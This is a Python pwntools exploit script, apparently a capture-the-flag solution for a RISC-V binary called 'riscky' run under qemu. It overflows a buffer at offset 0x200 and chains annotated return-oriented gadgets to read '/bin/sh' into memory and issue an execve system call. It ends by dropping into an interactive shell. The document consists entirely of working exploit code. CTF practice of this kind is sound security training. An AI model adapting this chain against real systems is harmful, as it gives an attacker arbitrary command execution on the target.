#!/usr/bin/env python3
from pwn import *

context.update(arch="riscv", os="linux")

exe = ELF('./riscky')

def start():
    command = ["/usr/bin/qemu-riscv64"]
    if args.GDB:
        command += ["-g", "1234"]
    command += [exe.path]
    p = process(command)
    g = process([
        "terminator",
        "--new-tab",
        "-x",
            # "gdb-multiarch",
            "./riscky",
            "-ex",
            "'source /opt/gef/gef.py'",
            "-ex",
            "'set architecture riscv:rv64'", 
            "-ex",
            "'target remote :1234'",
            "-ex",
            "'b main'"
    ])
    return p

# the gadget we will use to set out registers
setcontext_gadget   = 0x4110e
'''
4110e:	832a                	mv	t1,a0
41110:	60a6                	ld	ra,72(sp)
41112:	6522                	ld	a0,8(sp)
41114:	65c2                	ld	a1,16(sp)
41116:	6662                	ld	a2,24(sp)
41118:	7682                	ld	a3,32(sp)
4111a:	7722                	ld	a4,40(sp)
4111c:	77c2                	ld	a5,48(sp)
4111e:	7862                	ld	a6,56(sp)
41120:	6886                	ld	a7,64(sp)
41122:	2546                	fld	fa0,80(sp)
41124:	25e6                	fld	fa1,88(sp)
41126:	3606                	fld	fa2,96(sp)
41128:	36a6                	fld	fa3,104(sp)
4112a:	3746                	fld	fa4,112(sp)
4112c:	37e6                	fld	fa5,120(sp)
4112e:	280a                	fld	fa6,128(sp)
41130:	28aa                	fld	fa7,136(sp)
41132:	6149                	addi	sp,sp,144
41134:	8302                	jr	t1
'''

# that sets a0 and in the setcontext gadget it is moved to t1
# so we can pass here the address to jump to
ld_a0               = 0x45bc0
'''
45bc0:  70a2                    ld      ra,40(sp)
45bc2:	6542                	ld	    a0,16(sp)
45bc4:	6145                	addi	sp,sp,48
45bc6:	8082                	ret
'''

ecall               = 0x10446
'''
10446:	00000073          	ecall
'''

io = start()
main_addr           = 0x10620

offset = 0x200
payload = b""
payload += cyclic_gen().get(offset)
payload += p64(ld_a0) + p64(0x0)*2 + p64(exe.sym.gets) + p64(0x0)*2 + p64(setcontext_gadget)
payload += p64(0x0) + p64(0x70f00) + p64(0x0)*6 + p64(0xdd) + p64(ld_a0) + p64(0x0)*8
payload += p64(ld_a0) + p64(0x0) + p64(ecall) + p64(0x0)*2 + p64(setcontext_gadget)
payload += p64(0x0) + p64(0x70f00) + p64(0x0)*6 + p64(0xdd) + p64(ecall) + p64(0x0)*8
io.sendlineafter(b">", payload)
io.sendline(b"/bin/sh\x00")

io.interactive()


